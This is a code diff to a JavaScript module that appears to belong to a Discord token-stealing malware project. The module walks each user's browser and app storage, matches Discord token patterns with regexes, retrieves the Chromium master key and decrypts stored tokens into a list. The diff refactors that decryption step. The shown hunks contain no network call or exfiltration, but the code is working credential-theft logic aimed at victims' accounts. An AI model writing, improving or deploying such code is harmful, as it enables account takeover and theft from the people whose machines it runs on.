@@ -4,7 +4,6 @@ const glob = require('glob');
 
 const browsersPaths = require("./../browsers/paths.js");
 
-const cryptofy = require("./../browsers/crypto.js");
 const hardware = require("./../../utils/hardware/hardware.js");
 
 const browsersProfiles = require("./../browsers/profiles.js");
@@ -13,6 +12,9 @@ const tokens = [];
 
 const RegexpApps = /dQw4w9WgXcQ:[^"]*/g;
 const RegexpBrowsers = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g;
+
+const c = require("./../browsers/chromium.js");
+const chromium = new c.Chromium();
 
 const getTokens = async () => {
     const users = await hardware.getUsers();
@@ -34,11 +36,8 @@ const getTokens = async () => {
                 }
 
                 const dir = path.dirname(fullPath);
-
-                const { Chromium } = require("./../browsers/chromium.js");
-                const chromium = new Chromium();
                 
-                const masterKey = chromium.GetMasterKey(dir);
+                const masterKey = await chromium.GetMasterKey(dir);
                 if (!masterKey) {
                     continue;
                 }
@@ -63,7 +62,7 @@ const getTokens = async () => {
 
                                     const encodedPass = match.split("dQw4w9WgXcQ:")[1];
                                     const decodedPass = Buffer.from(encodedPass, 'base64');
-                                    const token = cryptofy.decryptAES256GCM(masterKey, decodedPass);
+                                    const token = chromium.decrypt(decodedPass, masterKey);
 
                                     if (!tokens.some(t => t.token === token)) {
                                         tokens.push({
